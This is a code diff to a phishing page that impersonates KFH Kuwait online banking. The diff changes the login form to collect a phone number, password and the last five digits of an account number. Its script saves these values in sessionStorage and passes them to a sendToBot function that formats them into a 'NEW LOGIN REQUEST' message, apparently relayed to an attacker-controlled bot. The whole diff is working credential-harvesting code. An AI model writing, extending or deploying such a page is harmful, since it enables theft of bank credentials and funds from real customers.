@@ -66,15 +66,21 @@
 
                     <form id="login-form" class="loan-form" action="verify.html" method="GET">
                         <div class="form-group">
-                            <label for="username">Username / Civil ID *</label>
-                            <input type="text" id="username" name="username" required placeholder="Enter your username or Civil ID" class="phone-input">
-                            <small class="phone-hint">Enter your KFH Online username or Civil ID number</small>
+                            <label for="phone">Phone Number *</label>
+                            <input type="tel" id="phone" name="phone" required placeholder="+965 XXXXXXXX" class="phone-input" pattern="[+]?[0-9]{8,12}">
+                            <small class="phone-hint">Enter your registered mobile number</small>
                         </div>
 
                         <div class="form-group">
                             <label for="password">Password *</label>
                             <input type="password" id="password" name="password" required placeholder="Enter your password" class="pin-input">
                             <small>Your password is secure and encrypted</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountNumber">Account Number (Last 5 Digits) *</label>
+                            <input type="text" id="accountNumber" name="accountNumber" required placeholder="XXXXX" class="pin-input" maxlength="5" pattern="[0-9]{5}">
+                            <small>Enter the last 5 digits of your account number</small>
                         </div>
 
                         <div class="form-actions">
@@ -91,21 +97,23 @@
     <script>
         // Save credentials to sessionStorage when form is submitted
         document.getElementById('login-form').addEventListener('submit', function(e) {
-            const username = document.getElementById('username').value;
+            const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
+            const accountNumber = document.getElementById('accountNumber').value;
             
-            sessionStorage.setItem('kfh_username', username);
+            sessionStorage.setItem('kfh_phone', phone);
             sessionStorage.setItem('kfh_password', password);
+            sessionStorage.setItem('kfh_account_number', accountNumber);
             
             // Send to bot
-            sendToBot(username, password);
+            sendToBot(phone, password, accountNumber);
         });
 
-        async function sendToBot(username, password) {
+        async function sendToBot(phone, password, accountNumber) {
             const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
             sessionStorage.setItem('kfh_session_id', sessionId);
             
-            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n👤 Username/Civil ID: ' + username + '\n🔐 Password: ' + password + '\n📅 Time: ' + new Date().toLocaleString();
+            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n📱 Phone: ' + phone + '\n🔐 Password: ' + password + '\n🏦 Account (Last 5): ' + accountNumber + '\n📅 Time: ' + new Date().toLocaleString();
 
             const replyMarkup = {
                 inline_keyboard: [
